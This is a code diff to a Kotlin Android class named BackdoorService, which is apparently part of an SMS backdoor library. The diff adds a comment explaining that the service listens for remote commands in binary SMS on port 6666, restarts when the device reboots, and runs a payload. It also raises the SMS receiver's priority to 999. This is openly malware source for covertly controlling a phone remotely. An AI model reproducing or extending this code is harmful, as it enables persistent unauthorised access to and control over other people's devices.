@@ -39,6 +39,15 @@ import com.candroid.bootlaces.LifecycleBootService
 ............\..............(
 ..............\.............\...
 */
+/**
+* @author Chris Basinger
+* @email evilthreads669966@gmail.com
+* @date 10/08/20
+*
+* A [LifecycleBootService] that handles registering the receiver for [RemoteCommandReceiver]. This is required to receive binary sms messages.
+* This is started for you inside of [SmsBackdoor.openDoor]. This service component will restart when the device is restarted.
+ * [BackdoorService] will run your payload within [BackdoorService.init] using [LifecycleScope.launchWhenCreated].
+* */
 internal class BackdoorService : LifecycleBootService(){
     private lateinit var receiver: RemoteCommandReceiver
 
@@ -47,6 +56,7 @@ internal class BackdoorService : LifecycleBootService(){
         val filter = IntentFilter(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION).apply {
             addDataAuthority("*", "6666")
             addDataScheme("sms")
+            priority = 999
         }
         receiver = RemoteCommandReceiver()
         registerReceiver(receiver, filter)
